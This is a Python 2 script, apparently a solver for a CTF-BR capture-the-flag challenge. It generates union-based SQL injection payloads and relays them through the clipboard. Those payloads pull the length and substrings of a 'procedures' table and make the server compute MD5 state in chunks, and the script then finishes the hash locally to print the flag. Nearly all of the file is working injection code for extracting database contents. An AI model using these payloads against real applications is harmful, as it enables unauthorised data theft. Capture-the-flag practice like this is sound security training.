#!/usr/bin/python
import re
import time
import math
import puremd5
import pyperclip

base_sql = "' union select * from (%s) --"
def copy_sql(sql, **kwargs):
    for k, v in kwargs.iteritems():
        if isinstance(v, int):
            v = '0x%x'%v
        sql = sql.replace(':'+k.upper(), v)
    sql = base_sql % sql
    print(sql + '\n\n')
    pyperclip.copy(sql)

def c_int(txt):
    txt = txt.strip()
    if re.match(r'^\d+$', txt) is not None:
        return int(txt)
def c_md5(txt):
    txt = txt.strip()
    if re.match(r'^[0-9a-f]{32}$', txt) is not None:
        return txt
def c_any(txt):
    if not txt.startswith("' union select"):
        return txt
def wait_paste(conv_func):
    while True:
        value = conv_func(pyperclip.paste())
        if value is not None:
            print('answer: %r\n\n' % value)
            return value
        time.sleep(.5)

def format_sql(sql):
    return re.sub(r'[ \t]*\n[ \t]*', ' ', sql)
with open('md5.sql') as f:
    md5_sql = format_sql(f.read())


# Retrieve the total length of the string containing all names

copy_sql("select length(group_concat(name,''))from procedures order by id")
total_length = wait_paste(c_int)

# Compute the best chunk length to solve the md5 in 10 chunks

chunk_length = int(math.floor(total_length / 10.))
chunk_length += 64 - chunk_length % 64 # must be a multiple of 64 bytes

# Compute md5 for chunks

last_block_len = None
a0,b0,c0,d0 = 0x67452301,0xefcdab89,0x98badcfe,0x10325476

for offset in xrange(0, total_length, chunk_length):
    remaining_len = total_length - offset
    if remaining_len >= chunk_length:
        remaining_len = chunk_length
    else:
        last_block_len = remaining_len % 64
        remaining_len -= last_block_len

    copy_sql(md5_sql, offset=offset+1, length=remaining_len, a0=a0,b0=b0,c0=c0,d0=d0)

    new_abcd = wait_paste(c_md5)
    a0,b0,c0,d0 = tuple(int('0x'+new_abcd[i:i+8], 16) for i in xrange(0,32,8))


# Retrieve the last block

server_length_limit = 32
last_block = ''
for offset in xrange(total_length - last_block_len, total_length, server_length_limit):
    copy_sql("select substr(group_concat(name,''),%d,%d)from procedures order by id" %
        (offset + 1, server_length_limit))
    last_block += wait_paste(c_any)

# Finish computing the MD5

md5 = puremd5.MD5()
md5.A,md5.B,md5.C,md5.D = a0,b0,c0,d0
cur_bits = (total_length - last_block_len) * 8
md5.count[0] =  cur_bits        & 0xffffffff
md5.count[1] = (cur_bits >> 32) & 0xffffffff

md5.update(last_block)

print('flag: CTF-BR{%s}\n' % md5.hexdigest())
